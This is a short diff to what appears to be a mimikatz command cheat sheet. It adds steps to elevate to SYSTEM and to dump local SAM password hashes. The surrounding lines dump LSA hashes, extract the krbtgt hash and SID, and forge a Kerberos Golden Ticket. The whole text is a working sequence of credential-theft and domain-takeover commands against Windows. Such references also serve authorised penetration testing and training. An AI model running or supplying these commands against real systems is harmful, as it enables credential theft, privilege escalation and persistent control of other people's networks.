@@ -14,11 +14,17 @@ mimikatz
 # Check if mimikatz running as an administrator
 mimikatz # privilege::debug
 
+# Elevate to SYSTEM level.
+mimikatz # token::elevate
+
 # Dump hashes
 mimikatz # lsadump::lsa /patch
 
 # Dump hash and security identifier of the Kerberos Ticket Granting Ticket account
 mimikatz # lsadump::lsa /inject /name:krbtgt
+
+# Dump all SAM local password hashes
+mimikatz # lsadump::sam
 
 # Create a Kerberos Golden Ticket
 mimikatz # kerberos::golden /user:Administrator /domain:sample.domain /sid
